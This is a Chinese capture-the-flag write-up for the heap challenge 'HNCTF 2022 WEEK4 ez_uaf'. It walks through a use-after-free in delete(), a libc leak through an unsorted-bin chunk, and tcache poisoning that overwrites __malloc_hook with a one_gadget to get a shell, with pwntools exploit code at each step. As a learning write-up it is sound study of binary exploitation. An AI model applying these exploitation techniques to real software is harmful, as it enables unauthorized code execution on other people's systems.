---
title: '[HNCTF 2022 WEEK4] ez_uaf'
date: 2024-04-030 13:00:00 +0800
categories: [uaf,unsortedbin,leak_libc]
tags: [ctf,pwn]
---

```shell
[*] '/home/bamuwe/ez_uaf/ez_uaf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

> $ checksec ./ez_uaf

```shell
Easy Note.
1.Add.
2.Delete.
3.Show.
4.Edit.
Choice:
```

> $ ./ez_uaf

```c
__int64 delete()
{
  __int64 result; // rax
  signed int v1; // [rsp+Ch] [rbp-4h]

  puts("Input your idx:");
  v1 = getnum();
  if ( v1 <= 0xF && *(*(&heaplist + v1) + 28LL) )
  {
    free(*(*(&heaplist + v1) + 16LL));
    free(*(&heaplist + v1));
    result = *(&heaplist + v1);
    *(result + 28) = 0;
  }
  else
  {
    puts("Error idx!");
    return 0LL;
  }
  return result;
}
```

> delete()漏洞函数,没有清除指针

```python
def add(size,name,content):
    io.sendlineafter(b'Choice: \n',b'1')
    io.sendlineafter(b'Size:\n',str(int(size)))
    io.sendafter(b'Name: \n',name)
    io.sendafter(b'Content:\n',content)

def free(idx):
    io.sendlineafter(b'Choice: \n',b'2')
    io.sendlineafter(b'idx:\n',str(int(idx)))

def show(idx):
    io.sendlineafter(b'Choice: \n',b'3')
    io.sendlineafter(b'idx:\n',str(int(idx)))
    
def edit(idx,content):
    io.sendlineafter(b'Choice: \n',b'4')
    io.sendlineafter(b'idx:\n',str(int(idx)))
    io.send(content)
```

> 交互函数

程序逻辑:

1. `add()`一个`chunk`
2. `free()`这个区块后仍然可以对这个区块进行`edit()`,`show()`

利用思路:

1. 利用unsortbin指向自身的特点,泄露出`main_arena`的地址,进而泄露出`__malloc_hook`的地址

   ```python
   add(0x410,b'a',b'a')    #0
   add(0x20,b'b',b'1111')  #1						#后续利用的chunk
   add(0x10,b'c',b'c')     #2						#后续利用的chunk
   free(0)                                         #unsortbin指向自身
   show(0)
   #leak_libc
   io.recvuntil(b'\n')
   malloc_hook_addr = u64(io.recv(6).ljust(8,b'\x00'))-96-16
   success(f'malloc_hook_addr=> {hex(malloc_hook_addr)}')
   lib_offset = malloc_hook_addr - lib.sym['__malloc_hook']
   one_gadgets_addr = 0x10a2fc+lib_offset			#后续利用
   ```

   ![image-20240430195924018](./../../AppData/Roaming/Typora/typora-user-images/image-20240430195924018.png)

2. 释放`chunk1`并且修改`chunk1`的`fd`的地址为`__malloc_hook`的地址,制造`fake_chunk`

   ```python
   free(1)
   edit(1,p64(malloc_hook_addr))       # 修改fd
   ```

   ![image-20240430200315872](./../../AppData/Roaming/Typora/typora-user-images/image-20240430200315872.png)

3. 利用`fake_chunk`修改`__malloc_hook` 的内容为`one_gadget`,重新`add()`一个`chunk`得到`shell`

   ```python
   add(0x10,b'2',b'2')     #3          #tcachebin规则          
   add(0x20,b'3',b'3')     #4        #fake_chunk,地址为malloc_hook_addr
   edit(4,p64(one_gadgets_addr))
   
   io.sendlineafter(b'Choice: \n',b'1')
   io.sendlineafter(b'Size:\n',b'0x20')
   ```

   提到`tcachebin`规则,由上图可知,当前`tcachebin`在`malloc_hook`之前还有两个堆块,所以我们要填充再利用

关于`unsortedbin`:

> 1.当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
>
> 2.释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。
>
> 3.当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。

